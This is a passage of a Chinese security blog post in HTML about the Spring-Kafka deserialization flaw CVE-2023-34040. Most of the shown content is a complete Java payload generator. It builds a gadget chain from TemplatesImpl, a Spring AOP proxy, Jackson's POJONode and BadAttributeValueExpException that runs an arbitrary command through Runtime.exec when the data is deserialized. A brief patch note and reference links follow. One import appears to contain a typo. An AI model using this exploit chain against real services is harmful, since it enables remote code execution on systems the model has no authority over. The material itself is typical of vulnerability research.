class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.demo.producer;<br><br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><span class="hljs-keyword">import</span> org.springframework.aop.framework.AdvisedSupport;<br><span class="hljs-keyword">import</span> xrg.springframework.kafka.support.serializer.DeserializationException;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PayloadGeneration</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] ser(<span class="hljs-keyword">final</span> Object obj) <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        ObjectOutputStream  oos= <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(obj);<br>        <span class="hljs-keyword">return</span> baos.toByteArray();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] getPayload(String cmd) <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(makeTemplatesImplAopProxy(cmd));<br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        setFieldValue(val, <span class="hljs-string">&quot;val&quot;</span>, node);<br><br>        <span class="hljs-type">DeserializationException</span> <span class="hljs-variable">exception</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DeserializationException</span>(val);<br>        <span class="hljs-type">byte</span>[] data = ser(exception);<br>        data[<span class="hljs-number">8</span>] = <span class="hljs-string">&quot;o&quot;</span>.getBytes()[<span class="hljs-number">0</span>]; <span class="hljs-comment">// AC ED 00 05 74 00 05 68</span><br>        <span class="hljs-keyword">return</span> data;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">makeTemplatesImpl</span><span class="hljs-params">(String cmd)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd + <span class="hljs-string">&quot;\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        <span class="hljs-type">byte</span>[][] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, bytes);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br>        <span class="hljs-keyword">return</span> templates;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">makeTemplatesImplAopProxy</span><span class="hljs-params">(String cmd)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">AdvisedSupport</span> <span class="hljs-variable">advisedSupport</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AdvisedSupport</span>();<br>        advisedSupport.setTarget(makeTemplatesImpl(cmd));<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>).getConstructor(AdvisedSupport.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(advisedSupport);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;, handler);<br>        <span class="hljs-keyword">return</span> proxy;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h1 id="Patch"><a href="#Patch" class="headerlink" title="Patch"></a>Patch</h1><p><img src="/./../img/image-20231110235842686.png" srcset="/img/loading.gif" lazyload alt="image-20231110235842686"></p>
+<p>限制记录头只能是<code>DeserializationException</code>类型，客户端控制不了。</p>
+<h1 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h1><ul>
+<li><a target="_blank" rel="noopener" href="https://spring.io/security/cve-2023-34040">https://spring.io/security/cve-2023-34040</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/Contrast-Security-OSS/Spring-Kafka-POC-CVE-2023-34040">https://github.com/Contrast-Security-OSS/Spring-Kafka-POC-CVE-2023-34040</a></li>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12846">https://xz.aliyun.com/t/12846</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/spring-projects/spring-kafka/commit/25ac793a78725e2ca4a3a2888a1506a4bfcf0c9d">https://github.com/spring-projects/spring-kafka/commit/25ac793a78725e2ca4a3a2888a1506a4bfcf0c9d</a></li>
+</ul>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/security/" class="print-no-link">#security</a>
+      
+        <a href="/tags/java/" class="print-no-link">#java</a>
+      
+        <a href="/tags/middleware/" class="print-no-link">#middleware</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Spring-Kafka CVE-2023-34040</div>
+      <div>http://example.com/2023/11/10/kafka/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>John Doe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年11月10日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/11/10/amqp/" title="Spring-AMQP CVE-2023-34050">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Spring-AMQP CVE-2023-34050</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/11/06/activemq/" title="Apache ActiveMQ CNVD-2023-69477">
+                        <span class="hidden-mobile">Apache ActiveMQ CNVD-2023-69477</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
